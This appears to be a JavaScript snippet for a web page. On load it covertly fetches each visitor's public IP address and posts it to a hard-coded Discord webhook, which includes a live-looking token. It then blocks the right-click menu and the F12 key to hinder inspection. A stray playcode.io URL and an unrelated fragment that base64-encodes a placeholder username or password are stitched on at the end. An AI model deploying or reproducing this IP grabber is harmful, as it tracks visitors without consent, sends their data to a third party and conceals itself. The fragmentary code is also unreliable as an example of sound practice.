var ip = '';
fetch('https://api.ipify.org/?format=json')
.then(function(response) {
    return response.json();

})
.then(function(data) {
    ip = data.ip;
    var webhook = 'https://discord.com/api/webhooks/1145098382998777957/uRjKaivvjCKwlY3o4j4ItQFwd0EJGPwMaRpCI8IH46r1oDs0nwONdcrwXX8EWfZfREQ5'
    var message = {
        content: 'IP:' + ip
    };

    fetch(webhook, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'

        },
        body: JSON.stringify(message)

    });
    
});
document.addEventListener("contextmenu", function (e) {
    e.preventDefault();
  });
  document.addEventListener("keydown", function (e) {
    if (e.key === "F12") {
      e.preventDefault();
    }
  });
  https://playcode.io/

var baseString = "<new user or pass here>";
var encodedString = window.btoa( baseString );
document.write(encodedString);

<javascript></javascript>